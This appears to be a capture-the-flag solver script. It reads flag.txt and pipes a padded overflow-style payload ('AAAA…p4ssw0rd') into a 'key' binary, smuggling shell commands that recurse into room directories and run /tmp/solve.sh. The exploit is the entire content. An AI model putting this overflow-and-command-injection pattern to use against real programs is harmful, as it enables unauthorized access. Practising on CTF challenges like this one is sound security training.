echo -n . 1>&2

if [ -f "flag.txt" ]; then
    cat flag.txt 1>&2
fi

if [ -f "key" ]; then
    payload=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp4ssw0rd
    (echo $payload && echo "cd room0 && exec bash /tmp/solve.sh") | ./key > /dev/null
    (echo $payload && echo "cd room1 && exec bash /tmp/solve.sh") | ./key > /dev/null
fi
